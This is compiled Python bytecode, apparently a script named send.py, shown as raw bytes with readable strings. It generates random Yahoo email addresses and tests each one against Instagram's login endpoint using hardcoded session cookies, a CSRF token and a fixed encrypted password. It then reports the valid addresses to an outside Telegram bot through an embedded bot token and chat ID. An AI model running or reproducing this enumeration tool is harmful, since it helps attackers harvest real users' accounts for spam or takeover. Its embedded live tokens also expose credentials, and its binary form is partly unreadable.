a
    KD9`  �                   @   s�   d dl Z d dlZd dlZd dlmZ e�d� e� Zdaddddd	d
dddddddddddddddd�add� Zdd� Z	e�  e	�  e
�  dS )�    N)�Faker�clearz.https://www.instagram.com/accounts/login/ajax/zwww.instagram.comZPOSTz/accounts/login/ajax/Zhttpsz*/*zgzip, deflate, brz#en-US,en;q=0.9,ar;q=0.8,en-GB;q=0.7Z277z!application/x-www-form-urlencodedz�ig_did=D9AD55FF-D40F-4569-8F3D-72923D6B496D; mid=X-oMXwAEAAFsGP-VB_KrvTNjqpMV; ig_nrcb=1; datr=lbztX-QwAT9uM6uzLDWzbgof; fbm_124024574287414=base_domain=.instagram.com; ds_user_id=45246725385; csrftoken=u27l2skXxXS3smNyYh7bYQ7GZeC39zq5zhttps://www.instagram.comz)https://www.instagram.com/accounts/login/�emptyZcorszsame-originzrMozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36Z u27l2skXxXS3smNyYh7bYQ7GZeC39zq5Z936619743392459�0Z7a3a3e64fa87ZXMLHttpRequest)Z	authority�method�pathZschemeZacceptzaccept-encodingzaccept-languagezcontent-lengthzcontent-typeZcookie�originZrefererzsec-fetch-destzsec-fetch-modezsec-fetch-sitez
user-agentzx-csrftokenzx-ig-app-idzx-ig-www-claimzx-instagram-ajaxzx-requested-withc            
      C   s�   t � } tdd�}t�d� td�D ]t}d}| �� }|d |d  |d  |d	  }t�|�}t�|�}t�|�}|| | }|| d
 }	|�|	d � q"t�d� d S )N�	email.txt�wr   ��   Z10928374659430183274658r   �   �   �   z
@yahoo.com�
)	r   �open�os�system�range�name�randomZchoice�write)
�fakerZahmaw�x�a�tZx1Zx2Zx3ZhamwiZani� r   �send.py�email=   s    

 


r   c                  C   s�   t �d� tdd��� } | D ]�}|�� }|dddd�}|�� }tjtt|d�j	}d	|v r�t
d
� t
|d � d}|}d}d}d| d | d | }	t�|	�}
qd|v r�t
d
� t
d
� t
d� t
d
� qt
d
� t
|d � qd S )Nr   r	   �rz�#PWD_INSTAGRAM_BROWSER:10:1613910809:AZJQALDAleQsUwvq5s+tkCBrrlExq5b+/Gkk98iK8p26YHcVdbjMGONMoenLyrpwurfjtiLwd7T21klGL+lJO65ow22AdoYpNZjaesulmojmAzXwx7E2CqMNFUKxGiF5/a/p8M7NAfv+RcvvE8E=z{}Zfalse)ZusernameZenc_passwordZqueryParamsZoptIntoOneTap)Zheaders�dataz"user":true� z >= [1;32mEMIL TRUE[1;37m ZAniz.1602282060:AAH8NJmYFPpF3wlN6oEWoUYkOk5HrcNVy1QZ
1615347852zhttps://api.telegram.org/botz/sendMessage?chat_id=z&parse_mode=Markdown&text=z;"message":"Please wait a few minutes before you try again."z - BLOCK BWI - z >= [1;31mNOT TRUE[1;37m)r   r   r   �	readlines�strip�requestsZpost�url�head�text�print�get)Zfilerr   �ur   �rer   Zbot_messageZ	bot_tokenZ
bot_chatIDZ	send_textZresponser   r   r   �cheker_instaP   s6    
�
r+   )r#   r   r   r   r   r   r$   r%   r   r+   �exitr   r   r   r   �<module>   sB   
	�#